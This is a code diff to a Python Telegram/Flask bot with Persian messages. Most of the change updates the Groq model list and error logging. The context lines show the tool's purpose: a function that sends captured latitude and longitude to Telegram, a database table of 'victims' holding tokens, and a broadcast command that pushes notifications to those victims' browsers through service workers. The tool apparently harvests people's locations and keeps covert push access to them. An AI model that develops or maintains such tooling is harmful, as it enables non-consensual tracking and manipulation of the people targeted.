@@ -87,15 +87,19 @@ def send_telegram_location(lat, lng):
     except Exception as e:
         app.logger.error(f"Telegram location failed: {e}")
 
-# -------------------- Groq AI (Fixed) --------------------
+# -------------------- Groq AI (Corrected Models) --------------------
 def ask_groq(prompt):
     if not GROQ_API_KEY:
         return "⚠️ کلید Groq تنظیم نشده است."
     try:
         url = "https://api.groq.com/openai/v1/chat/completions"
         headers = {"Authorization": f"Bearer {GROQ_API_KEY}", "Content-Type": "application/json"}
-        # لیست مدل‌های معتبر و رایگان – مدل اول را امتحان کن، در صورت شکست مدل دوم
-        models = ["llama3-70b-8192", "mixtral-8x7b-32768"]
+        # مدل‌های فعال و رایگان Groq تا سال ۲۰۲۶ – اولین مدل موفق را برمی‌گرداند
+        models = [
+            "llama-3.1-8b-instant",       # سریع و همیشه در دسترس
+            "gemma2-9b-it",               # مدل سبک گوگل
+            "llama-3.3-70b-versatile",    # قدرتمند
+        ]
         last_error = None
         for model in models:
             payload = {
@@ -108,9 +112,10 @@ def ask_groq(prompt):
                 data = resp.json()
                 return data['choices'][0]['message']['content'].strip()
             else:
-                last_error = f"مدل {model}: {resp.status_code} - {resp.text[:150]}"
-        app.logger.error(f"Groq failed: {last_error}")
-        return f"❌ هوش مصنوعی موقتاً در دسترس نیست.\nجزئیات: {last_error}"
+                last_error = f"مدل {model}: {resp.status_code} - {resp.text[:200]}"
+                app.logger.warning(f"Groq model {model} failed: {resp.status_code}")
+        app.logger.error(f"Groq all models failed: {last_error}")
+        return f"❌ هوش مصنوعی در دسترس نیست.\nجزئیات: {last_error}"
     except Exception as e:
         app.logger.error(f"Groq exception: {e}")
         return "❌ خطا در ارتباط با هوش مصنوعی."
@@ -640,7 +645,6 @@ async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     conn = get_db_connection()
     victims = conn.execute("SELECT token FROM victims").fetchall()
     conn.close()
-    # In a real scenario, you would send push notifications to all registered service workers
     await update.message.reply_text(f"📢 پیام به {len(victims)} قربانی ارسال خواهد شد (در صورت آنلاین بودن، نوتیفیکیشن دریافت می‌کنند).")
 
 # --- Auto-reply with learned words, then AI ---
